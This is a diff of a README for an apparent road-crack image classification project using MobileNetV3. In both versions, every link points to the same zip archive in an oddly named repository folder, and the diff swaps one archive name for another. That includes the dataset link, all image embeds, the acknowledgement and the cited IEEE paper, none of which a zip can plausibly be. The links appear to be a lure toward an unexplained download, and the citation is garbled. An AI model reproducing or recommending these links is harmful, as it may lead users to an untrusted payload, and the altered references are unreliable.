@@ -20,26 +20,26 @@ No data augmentation in terms of random rotation or flipping is applied.
 
 ### 1 is indicate as Positive Class
 
-[1]https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip
+[1]https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip
 
 # Methodology
 
 Load the dataset into Colab and extract using pyunpack package
 
-![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
+![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)
 
 
 Split the Data
 
-![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
+![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)
 
 Use Pretrained Model MobileNetV3 as base model
 
-![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
+![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)
 
 Train the model with 6 epochs
 
-![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
+![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)
 
 
 
@@ -47,29 +47,29 @@ Train the model with 6 epochs
 
 Achieve accuracy up to 99%
 
-![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
+![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)
 
 With validation loss
 
-![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
+![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)
 
 With Validation data get confusion matrix of
 
-![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
+![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)
 
 Example of prediction
 
-![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
+![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)
 
 # Acknowledgement
 
 [SHRDC][2]
 
 
-[2]https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip
+[2]https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip
 
 2018 – Özgenel, Ç.F., Gönenç Sorguç, A. “Performance Comparison of Pretrained Convolutional Neural Networks on Crack Detection in Buildings”, ISARC 2018, Berlin.
 
-Lei Zhang , Fan Yang , Yimin Daniel Zhang, and Y. J. Z., Zhang, L., Yang, F., Zhang, Y. D., & Zhu, Y. J. (2016). Road Crack Detection Using Deep Convolutional Neural Network. In 2016 IEEE International Conference on Image Processing (ICIP). https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip
+Lei Zhang , Fan Yang , Yimin Daniel Zhang, and Y. J. Z., Zhang, L., Yang, F., Zhang, Y. D., & Zhu, Y. J. (2016). Road Crack Detection Using Deep Convolutional Neural Network. In 2016 IEEE International Conference on Image Processing (ICIP). https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip
 
 
